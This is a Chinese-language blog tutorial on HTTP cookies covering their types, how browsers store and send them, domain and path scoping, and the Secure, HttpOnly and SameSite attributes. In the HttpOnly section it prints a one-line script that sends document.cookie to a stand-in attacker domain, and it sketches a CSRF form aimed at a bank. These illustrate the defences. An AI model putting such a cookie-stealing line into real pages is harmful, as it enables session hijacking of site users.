@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html class="no-js" lang="zh-cn">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>关于cookie - 曜灵（SUN）Site</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="关于cookie" />
+<meta property="og:description" content="我们都知道HTTP协议是无状态的，这种无状态意味着程序需要验证每一次请求，从而辨别客户端的身份。 Cookie，就是为了辨别客户端身份而储存在客户端本地的数据" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8E%9F%E7%90%86/%E5%85%B3%E4%BA%8Ecookie/" />
+<meta property="article:published_time" content="2021-08-10T18:08:13+08:00" />
+<meta property="article:modified_time" content="2021-08-10T18:08:13+08:00" />
+
+		<meta itemprop="name" content="关于cookie">
+<meta itemprop="description" content="我们都知道HTTP协议是无状态的，这种无状态意味着程序需要验证每一次请求，从而辨别客户端的身份。 Cookie，就是为了辨别客户端身份而储存在客户端本地的数据">
+
+
+<meta itemprop="datePublished" content="2021-08-10T18:08:13&#43;08:00" />
+<meta itemprop="dateModified" content="2021-08-10T18:08:13&#43;08:00" />
+<meta itemprop="wordCount" content="5264">
+
+
+
+<meta itemprop="keywords" content="网络原理,浏览器," />
+
+		<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="关于cookie"/>
+<meta name="twitter:description" content="我们都知道HTTP协议是无状态的，这种无状态意味着程序需要验证每一次请求，从而辨别客户端的身份。 Cookie，就是为了辨别客户端身份而储存在客户端本地的数据"/>
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+	
+	<link rel="stylesheet" href="/js/highlight/styles/agate.css">
+
+	<link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/custom.css">
+
+	<link rel="shortcut icon" href="/favicon.png">
+		
+  
+	
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?9476c4482071e4a786f624283467fed0";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+	
+	<style type="text/css">
+		 
+		pre {
+  		padding: 0;
+		}
+	</style>
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="曜灵（SUN）Site" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img-common/avatar1.jpeg">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">曜灵（SUN）Site</div>
+					<div class="logo__tagline">🌝 带着 &#34;偏见&#34; 去理解技术的世界</div>
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">菜单</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">首页</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/about/me/">
+				
+				<span class="menu__text">博主</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/about/site/">
+				
+				<span class="menu__text">站点</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="https://github.com/lianpf/lianpf.github.io">
+				
+				<span class="menu__text">编辑</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="https://github.com/lianpf/lianpf.github.io/issues">
+				
+				<span class="menu__text">反馈</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/search/">
+				
+				<span class="menu__text">搜索</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">关于cookie</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 12 16"><path d="M6 1c2.2 0 3.5 2 3.5 4.5C9.5 7 8.9 8.2 8 9c2.9.8 4 2.5 4 5v1H0v-1c0-2.5 1.1-4.2 4-5-.9-.8-1.5-2-1.5-3.5C2.5 3 3.8 1 6 1z"/></svg><span class="meta__text">曜灵</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2021-08-10T18:08:13&#43;08:00">2021-08-10</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8E%9F%E7%90%86/" rel="category">计算机原理</a>
+	</span>
+</div></div>
+		</header> 
+
+<div class="post__toc toc">
+	<div class="toc__title">目录</div>
+	<div class="toc__menu">
+		<nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#一-介绍-cookie">一、介绍<code>Cookie</code></a></li>
+<li><a href="#二-cookie-作用">二、<code>Cookie</code>作用</a></li>
+<li><a href="#三-cookie-类别">三、<code>Cookie</code>类别</a></li>
+<li><a href="#四-cookie的特性">四、cookie的特性</a>
+<ul>
+<li><a href="#1-后端通过http头设置">1.后端通过http头设置</a></li>
+<li><a href="#2-请求时通过http头传给后端">2.请求时通过http头传给后端</a></li>
+<li><a href="#3-前端可读写">3.前端可读写</a></li>
+<li><a href="#4-遵守同源策略">4.遵守同源策略</a></li>
+</ul></li>
+<li><a href="#五-cookie-属性">五、<code>Cookie</code>属性</a>
+<ul>
+<li><a href="#1-expires-max-age">1.<code>Expires</code>，<code>Max-Age</code></a></li>
+<li><a href="#2-domain">2.<code>Domain</code></a></li>
+<li><a href="#3-path">3.<code>Path</code></a></li>
+<li><a href="#4-secure">4.Secure</a></li>
+<li><a href="#5-httponly">5.HttpOnly</a></li>
+<li><a href="#6-samesite">6.SameSite</a>
+<ul>
+<li><a href="#6-1-samesite-的作用">6.1 SameSite 的作用</a></li>
+<li><a href="#6-2-samesite-的值">6.2 SameSite 的值</a></li>
+<li><a href="#6-3-跨站的判断">6.3 跨站的判断</a></li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+	</div>
+</div><div class="content post__content clearfix">
+			<p>我们都知道<code>HTTP协议</code>是<code>无状态</code>的，这种无状态意味着程序需要验证每一次请求，从而辨别客户端的身份。 <code>Cookie</code>，就是为了辨别客户端身份而储存在客户端本地的数据</p>
+
+<h2 id="一-介绍-cookie">一、介绍<code>Cookie</code></h2>
+
+<p><code>Cookie</code>由服务器生成，发送给浏览器，浏览器把<code>cookie</code>保存到<code>内存中</code>或者<code>某个目录下的文件内</code>，下一次请求同一网站时会把该<code>cookie</code>发送给服务器</p>
+
+<p>由于<code>cookie</code>是保存在<code>客户端</code>上的，所以浏览器加入了一些限制确保 cookie 不会被恶意使用，同时不会占据太多磁盘空间，所以 cookie 的<code>数量和大小</code>是有限的。
+不同浏览器对 cookie 数量和大小的限制，是不一样的。一般来说，单个域设置的 cookie 不应超过<code>50个</code>，每个 cookie 的大小不能超过<code>4KB</code>。超过限制以后，cookie 将被<code>忽略</code>，不会被设置</p>
+
+<h2 id="二-cookie-作用">二、<code>Cookie</code>作用</h2>
+
+<ol>
+<li>对话管理：保存已登录用户的凭证</li>
+<li>简单的缓存：存储一些简单的业务数据，比如购物车等需要记录的信息</li>
+<li>个性化：保存用户的偏好，比如网页的字体大小、背景色等等</li>
+<li>追踪：记录和分析用户行为</li>
+</ol>
+
+<h2 id="三-cookie-类别">三、<code>Cookie</code>类别</h2>
+
+<ul>
+<li><code>第一方cookie</code>：由相同站点发送的 cookie</li>
+<li><code>第三方cookie</code>：由跨站请求发送的cookie</li>
+</ul>
+
+<blockquote>
+<p>关于相同站点、跨站的判断在讲到<code>samesite</code>属性的时候会介绍</p>
+</blockquote>
+
+<ul>
+<li><code>会话cookie</code>：没有设置有效时间的 cookie。只要关闭了浏览器（注意不是关闭网页页面），cookie 就会被销毁。（cookie 存在于浏览器的内存中，当关闭了浏览器 cookie 就销毁了）</li>
+<li><code>永久cookie</code>：cookie 被保存在文件中，在有效时间内可长期存在，浏览器重启或机器重启都可以再次读取到cookie</li>
+</ul>
+
+<h2 id="四-cookie的特性">四、cookie的特性</h2>
+
+<h3 id="1-后端通过http头设置">1.后端通过http头设置</h3>
+
+<p><code>服务端</code>通过在<code>http响应头</code>中设置一个或多个Set-Cookie来设置 cookie</p>
+
+<h3 id="2-请求时通过http头传给后端">2.请求时通过http头传给后端</h3>
+
+<p>浏览器接收到<code>Set-Cookie</code>指令时，会将<code>cookie的名称与值</code>储存在浏览器的<code>cookie存放区</code>，并记录该cookie隶属的域名、网址路径、创建时间、过期时间、是否脚本可访问、是否为安全连接 等属性。</p>
+
+<p>当浏览器再次发出<code>HTTP Request</code>指令到服务器时，就会比对目前在浏览器的 cookie 存放区有沒有<code>该域名、该路径、尚未过期</code>以及<code>符合其它一些条件的cookie</code>，如果有的话就会包含在 HTTP Request 指令的<code>Cookie头</code>中，多个cookie以分号<code>;</code>分隔。如下图:
+<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/7/7/17329c262c90375e~tplv-t2oaga2asx-watermark.awebp" alt="" /></p>
+
+<blockquote>
+<p>假设浏览器在请求一个网页时，该网页包含 20 张图、3 个 CSS 文件、2 个 JavaScript 文件，那么同样一份 cookie 就会发送 25 次到服务端，如果 cookie 的大小有 4K 的话，光是浏览一个网页你可能就要从你的电脑发送出 100KB 的数据。
+所以使用 cookie 并非「多多益善」，而是要「小心使用」，否则会造成不必要的带宽浪费。</p>
+</blockquote>
+
+<h3 id="3-前端可读写">3.前端可读写</h3>
+
+<p><code>Javascript</code>可以使用<code>document.cookie</code>对当前网站的cookie进行读写：
+&gt; 注意：Javascript 可读写的 cookie 只能是没有用<code>http-only</code>限制的 cookie</p>
+
+<pre><code>// 读取浏览器中的cookie
+console.log(document.cookie);
+
+// 写入两个 cookie：myname 和 myhome
+// 通过执行多次 document.cookie=... 语句来添加多个 cookie
+document.cookie='myname=lhm;path=/;domain=.baidu.com';
+document.cookie='myhome=gd;path=/;domain=.baidu.com';
+</code></pre>
+
+<ul>
+<li>如果要修改某个<code>cookie</code>，只需用<code>document.cookie = ...</code>语句创建一个同名的cookie，注意domain和path要保持一致。则原来的cookie会被覆盖，达到修改的目的。</li>
+
+<li><p>如果要删除某个cookie，用document.cookie = &hellip;语句将cookie的过期时间修改为一个过去的时间，如下：</p>
+
+<pre><code>var exp = new Date();
+exp.setTime(exp.getTime() - 1);
+document.cookie = &quot;myhome=gd;path=/;domain=.baidu.com;expires=&quot; + exp.toGMTString();
+</code></pre></li>
+</ul>
+
+<p>将<code>max-age设置为0</code>也能达到删除的效果：</p>
+
+<pre><code>document.cookie = &quot;myhome=gd;path=/;domain=.baidu.com;max-age=0&quot;;
+</code></pre>
+
+<h3 id="4-遵守同源策略">4.遵守同源策略</h3>
+
+<p><strong><code>当前网页</code>只能访问与它<code>同源</code>的 cookie</strong>
+&gt; 是否同源是用当前网页网址和cookie的domain来判断的。
+谷歌浏览器通过F12-Application-Storage-Cookies-当前域名所查看到的 cookie，有两个来源，一是服务端通过在http响应头中设置的 cookie，二是浏览器在本地所读取到的 cookie。在本地读取 cookie 就需要遵守同源策略</p>
+
+<ul>
+<li>浏览器的同源策略中的同源指的是协议、域名、端口三者相同，而<code>cookie的同源仅要求域名</code>，也就是说，两个网址只要域名相同，就可以共享cookie，注意，这里不要求协议和端口相同。
+所以<a href="https://example.com:8080/和http://example.com:8081/的cookie是共享的，因为它们的domain都是`example.com`">https://example.com:8080/和http://example.com:8081/的cookie是共享的，因为它们的domain都是`example.com`</a></li>
+<li>同源策略认为<code>域和子域属于不同的域</code>，例如<code>child1.a.com</code>与<code>a.com</code>、<code>child1.a.com</code>与<code>child2.a.com</code>、<code>xxx.child1.a.com</code>与<code>child1.a.com</code>两两不同源</li>
+<li><code>一个页面可以为本域和任何父域设置cookie</code>，只要父域不是公共后缀（<a href="https://publicsuffix.org/">public suffix</a>）即可</li>
+</ul>
+
+<p>所以两个不同的子域想要共享cookie，只要把 cookie 的domain设成相同的父域即可。
+比如，<a href="http://child1.a.com">http://child1.a.com</a> 和 <a href="http://child2.a.com">http://child2.a.com</a> 想要共享cookie，只要把它们的 cookie 的domain设置成a.com即可</p>
+
+<blockquote>
+<p>设置cookie的时候，如果指定cookie的所属域名为像上面例子中的.baidu.com这样的顶级域名，那么二级域名和三级域名不用做任何设置，都可以读取这个cookie</p>
+</blockquote>
+
+<h2 id="五-cookie-属性">五、<code>Cookie</code>属性</h2>
+
+<h3 id="1-expires-max-age">1.<code>Expires</code>，<code>Max-Age</code></h3>
+
+<ul>
+<li><p><code>Expires</code>属性指定一个具体的<code>到期时间</code>，到了指定时间以后，浏览器就不再保留这个cookie。它的值是<code>UTC格式</code>，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换</p>
+
+<pre><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+</code></pre></li>
+</ul>
+
+<p>浏览器根据<code>本地时间</code>，决定 cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 cookie 一定会在服务器指定的时间过期</p>
+
+<ul>
+<li><code>Max-Age</code>属性指定从现在开始 cookie 存在的<code>秒数</code>，比如<code>60 * 60 * 24 * 365（即一年）</code>。过了这个时间以后，浏览器就不再保留这个 cookie。</li>
+<li>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</li>
+<li>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个<code>cookie</code>就是<code>Session Cookie</code>，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个<code>cookie</code></li>
+</ul>
+
+<h3 id="2-domain">2.<code>Domain</code></h3>
+
+<p><code>Domain</code>属性指定浏览器发出<code>HTTP请求</code>时，哪些域名要附带这个<code>cookie</code></p>
+
+<p>如果没有指定该属性，浏览器会默认将其设为<code>当前域名</code>，这时子域名将不会附带这个 cookie 。
+比如，<code>example.com</code>不设置 cookie 的<code>domain</code>属性，那么<code>sub.example.com</code>将不会附带这个 cookie</p>
+
+<blockquote>
+<p>举例验证一下：<br />
+1、修改hosts文件，为本地设置了两个域名
+<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/7/7/17329c266fcbf2ab~tplv-t2oaga2asx-watermark.awebp" alt="" /><br />
+2、在elin.com下的页面设置cookie，该 cookie 不设置domain
+<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/7/7/17329c266fcbf2ab~tplv-t2oaga2asx-watermark.awebp" alt="" /><br />
+3、访问该页面并查看 cookie<br />
+<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/7/7/17329c267472926b~tplv-t2oaga2asx-watermark.awebp" alt="" /><br />
+4、访问db.elin.com下的页面并查看 cookie<br />
+<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/7/7/17329c2674acc1d2~tplv-t2oaga2asx-watermark.awebp" alt="" /><br />
+可以看到子域名并不能看到这个 cookie</p>
+</blockquote>
+
+<p>如果指定了domain属性，那么子域名也会附带这个 cookie</p>
+
+<blockquote>
+<p>继续用上面的例子验证：<br />
+1、修改elin.com下的页面的cookie设置，该 cookie 设置domain<br />
+<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/7/7/17329c26a63f1ede~tplv-t2oaga2asx-watermark.awebp" alt="" /><br />
+2、清除该页面下的 cookie，重新访问该页面并查看 cookie<br />
+<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/7/7/17329c26a7e6d4fc~tplv-t2oaga2asx-watermark.awebp" alt="" /><br />
+3、刷新db.elin.com下的页面并查看 cookie<br />
+<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/7/7/17329c26a7f4fa5c~tplv-t2oaga2asx-watermark.awebp" alt="" /><br />
+可以看到子域名可以看到这个 cookie</p>
+</blockquote>
+
+<p>如果服务器指定的域名不属于服务器当前域名或者其父域名，浏览器会拒绝这个 cookie</p>
+
+<blockquote>
+<p>继续用上面的例子验证：<br />
+1、修改elin.com下的页面的cookie设置，该 cookie 的domain设置为一个不相关的域名<br />
+<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/7/7/17329c26a99e2c91~tplv-t2oaga2asx-watermark.awebp" alt="" /><br />
+2、清除该页面下的 cookie，重新访问该页面并查看 cookie<br />
+<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/7/7/17329c26a9697be4~tplv-t2oaga2asx-watermark.awebp" alt="" /><br />
+可以看到没有 cookie，浏览器拒绝了这个 cookie</p>
+</blockquote>
+
+<h3 id="3-path">3.<code>Path</code></h3>
+
+<p><code>Path</code>属性指定浏览器发出<code>HTTP请求</code>时，哪些路径要附带这个<code>cookie</code>。
+只要浏览器发现，Path属性值是<code>HTTP请求路径</code>的开头一部分，就会在头信息里面带上这个 cookie 。
+比如，Path属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该cookie。当然，前提是<code>域名必须一致</code></p>
+
+<h3 id="4-secure">4.Secure</h3>
+
+<p><code>Secure</code>属性指定浏览器只有在加密协议<code>HTTPS</code>下，才能将这个cookie发送到服务器。
+该属性只是一个开关，不需要指定值`</p>
+
+<p>通过谷歌浏览器<code>开发者工具控制台</code>设置一个Cookie具有Secure属性</p>
+
+<pre><code>document.cookie = 'softwhy=&quot;antzone&quot;;max-age=1200;path=/;secure;'
+</code></pre>
+
+<p>上述代码执行结果会出现如下两种情况：</p>
+
+<ul>
+<li>如果站点采用HTTPS，那么Cookie生成成功<br /></li>
+<li>如果站点采用HTTP，那么Cookie生成失败</li>
+</ul>
+
+<p>后端语言也遵循上面两条规则:</p>
+
+<ul>
+<li>如果连接到后端的请求采用 HTTPS，那么 Cookie 生成成功</li>
+<li>如果请求采用 HTTP，那么 Cookie 生成失败，尽管在HTTP头部有对应的 Set-Cookie 内容，但不会真正成功生成对应的 Cookie</li>
+</ul>
+
+<h3 id="5-httponly">5.HttpOnly</h3>
+
+<p><code>HttpOnly</code>属性指定该cookie无法通过JavaScript脚本拿到，主要是document.cookie、XMLHttpRequest对象和Request API。防止该cookie被脚本读到，只有浏览器发出HTTP请求时，才会带上该cookie</p>
+
+<blockquote>
+<p>下面是跨站点载入的一个恶意脚本的代码，能够将当前网页的cookie发往第三方服务器。如果设置了一个cookie的HttpOnly属性，就不会读到该cookie</p>
+</blockquote>
+
+<pre><code>(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;
+</code></pre>
+
+<h3 id="6-samesite">6.SameSite</h3>
+
+<h4 id="6-1-samesite-的作用">6.1 SameSite 的作用</h4>
+
+<blockquote>
+<p>用来限制第三方 Cookie，减少安全风险</p>
+</blockquote>
+
+<p>Chrome 51 开始，浏览器的 cookie 新增加了一个SameSite属性，SameSite 阻止浏览器将此 cookie 与跨站点请求一起发送，其主要目标是降低跨源信息泄漏的风险，同时也在一定程度上阻止了 CSRF 攻击和用户追踪</p>
+
+<p>Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 cookie 的HTTP请求，这就是CSRF 攻击</p>
+
+<p>举例来说，用户登陆了银行网站your-bank.com，银行服务器发来了一个 cookie</p>
+
+<pre><code>Set-Cookie:id=a3fWa;
+</code></pre>
+
+<p>用户后来又访问了恶意网站malicious.com，上面有一个表单</p>
+
+<pre><code>&lt;form action=&quot;your-bank.com/transfer&quot; method=&quot;POST&quot;&gt;
+  ...
+&lt;/form&gt;
+</code></pre>
+
+<p>用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 cookie 的请求</p>
+
+<p>Cookie 的 domain (your-bank.com) 与当前访问的网站 (malicious.com) 不一样，这种 cookie 就称为第三方 cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。
+比如，你的网页上请求了一张 Facebook 的图片，Facebook 返回数据的时候顺便返回了一个 cookie，这个 cookie 的 domain 是facebook.com</p>
+
+<pre><code>&lt;img src=&quot;facebook.com/face.png&quot;&gt;
+</code></pre>
+
+<p>下次你再访问 Facebook 时发出的请求就会带有这个 cookie，从而 Facebook 就会知道你是谁了</p>
+
+<h4 id="6-2-samesite-的值">6.2 SameSite 的值</h4>
+
+<p>设置三个值：Strict、Lax、None</p>
+
+<ul>
+<li>Strict</li>
+</ul>
+
+<p>Strict 是最严格的防护，将阻止浏览器在所有跨站点请求中将 cookie 发送到目标站点。因此这种设置可以阻止所有 CSRF 攻击</p>
+
+<p><code>Set-Cookie: CookieName=CookieValue; SameSite=Strict;</code></p>
+
+<p>这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 cookie，跳转过去总是未登陆状态。
+不过，具有交易业务的网站很可能不希望从外站链接到任何交易页面，因此这种场景最适合使用 strict 标志。</p>
+
+<ul>
+<li>Lax</li>
+</ul>
+
+<p>Lax规则稍稍放宽，大多数情况也是不发送第三方 cookie，但是导航到目标网址的Get请求除外。另外，使用JavaScript脚本发起的请求也无法携带第三方 cookie</p>
+
+<p><code>Set-Cookie: CookieName=CookieValue; SameSite=Lax;</code></p>
+
+<p>导航到目标网址的 GET 请求，只包括三种情况：</p>
+
+<ol>
+<li>链接<code>&lt;a href=&quot;...&quot;&gt;&lt;/a&gt;</code></li>
+<li>预加载请求<code>&lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt;</code></li>
+<li>以GET 方式提交的表单<code>&lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt;</code></li>
+</ol>
+
+<p>设置了 Strict 或 Lax 以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性</p>
+
+<ul>
+<li>None</li>
+</ul>
+
+<p>Chrome 计划将 Lax 变为默认设置。这时，网站可以选择显式关闭 SameSite 属性，将其设为None。不过，前提是必须同时设置Secure属性（Cookie 只能通过 HTTPS 协议发送），否则无效</p>
+
+<pre><code>// 设置无效
+Set-Cookie: widget_session=abc123; SameSite=None
+
+// 设置有效
+Set-Cookie: widget_session=abc123; SameSite=None; Secure
+</code></pre>
+
+<p>SameSite=None的 cookie 会在同站请求、跨站请求下发送：</p>
+
+<ol>
+<li>在旧版浏览器，如果SameSite属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于None，Cookies会被包含在任何请求中——包括跨站请求。</li>
+<li>但是，在Chrome 80+版本中，SameSite的默认属性是SameSite=Lax。换句话说，当 Cookie 没有设置 SameSite 属性时，将会视作 SameSite 属性被设置为Lax。如果想要指定 Cookies 在同站、跨站请求都被发送，那么需要明确指定 SameSite 为 None。具有 SameSite=None 的 Cookie 也必须标记为secure并通过HTTPS传送。</li>
+<li>Chrome 也宣布，将在下个版本也就是Chrome 83版本，在访客模式下禁用第三方 Cookie，在2022年全面禁用第三方 Cookie，到时候，即使你能指定 SameSite 为 None 也没有意义，因为你已经无法写入第三方 Cookie 了。</li>
+</ol>
+
+<h4 id="6-3-跨站的判断">6.3 跨站的判断</h4>
+
+<p>第一方cookie和第三方cookie的区别就是：是否是相同站点发送的（不同则为跨站）。
+所以第三方cookie也可以理解为跨站请求所设置的cookie。
+所以，第三方cookie定义中的跨站与samesite所作用的跨站请求中的跨站，两者的判断是一样的，所以我们放到一起来说。
+那么怎么判断是不是形成跨站了呢？
+我们是拿 “请求的目标URL（或者cookie的domain）” 和 “当前网站URL（也就是浏览器地址栏中的网址）” 这两者来进行比较从而判断是否形成跨站的。
+两者的ORIGIN的注册域相同则为相同站点，不同则构成跨站。所谓注册域，是指您可以购买或租用的域名，即公共后缀（public suffix）之下的一级，也称为顶级域名</p>
+
+<hr />
+
+<p><strong>最后， 希望大家早日实现：成为前端高手的伟大梦想！</strong>  <br>
+<strong>欢迎交流~</strong></p>
+
+<p><img src="/img-common/weChatPublic.jpg" alt="微信公众号" width="600" height="286" /></p>
+
+<p><strong>本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！</strong>  <br/>
+<strong>若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！</strong></p>
+		</div>
+		<footer class="post__footer">
+			
+<div class="post__tags tags clearfix">
+	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M32 19c0 1-1 2-1 2L21 31s-1 1-2 1-2-1-2-1L2 16c-1-1-1.4-2-1.4-2S0 12.5 0 11V3C0 1.5.8.8.8.8S1.5 0 3 0h8c1.5 0 3 .6 3 .6S15 1 16 2l15 15s1 1 1 2zM7 10a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/></svg>
+	<ul class="tags__list">
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/" rel="tag">网络原理</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/" rel="tag">浏览器</a>
+		</li>
+	</ul>
+</div>
+		</footer>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="曜灵 avatar" src="/img-common/avatar1.jpeg" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">关于 曜灵</span>
+	</div>
+	<div class="authorbox__description">
+		博主目前就职于X集团上海研发中心-平台工具组，是一名Web开发工程师。技术领域涉及 React技术栈、Vue技术栈、Hybrid、工程化，及node BFF层等相关内容。工作之余，积极为社区贡献自己的绵薄之力，现有若干独立的开源项目
+	</div>
+</div>
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0/git%E4%BD%BF%E7%94%A8%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;上一篇</span>
+			<p class="pager__title">Git使用常见问题汇总</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0/vue%E5%BC%80%E5%8F%91%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/" rel="next">
+			<span class="pager__subtitle">下一篇&thinsp;»</span>
+			<p class="pager__title">Vue开发问题汇总</p>
+		</a>
+	</div>
+</nav>
+<script src="https://utteranc.es/client.js"
+        repo="lianpf/lianpf.github.io"
+        issue-term="title"
+        label="comments"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+
+
+			</div>
+			<aside class="sidebar">
+<div class="widget-recent widget">
+	<h4 class="widget__title">近期文章</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/posts/%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0/29.chatgpt%E6%B3%A8%E5%86%8C%E4%BD%BF%E7%94%A8/">ChatGPT（OpenAI）注册及使用</a></li>
+			<li class="widget__item"><a class="widget__link" href="/posts/%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0/28.%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/">使用GitHub搭建图床</a></li>
+			<li class="widget__item"><a class="widget__link" href="/posts/%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0/27.github%E6%98%8E%E6%98%9F%E9%A1%B9%E7%9B%AE%E5%8F%8A%E7%BB%84%E7%BB%87/">GitHub和Gitee明星项目及组织</a></li>
+			<li class="widget__item"><a class="widget__link" href="/posts/%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0/26.npm%E5%8C%85%E7%AE%A1%E7%90%86%E4%B9%8Bpnpm/">npm包管理之pnpm</a></li>
+			<li class="widget__item"><a class="widget__link" href="/posts/%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0/24.%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E4%B9%8B%E9%94%99%E8%AF%AF%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/">工程化：错误监控系统</a></li>
+			<li class="widget__item"><a class="widget__link" href="/posts/%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0/23.%E5%BE%AE%E5%89%8D%E7%AB%AF%E5%92%8Cqiankun/">工程化：微前端和qiankun(乾坤)</a></li>
+		</ul>
+	</div>
+</div>
+<div class="widget-categories widget">
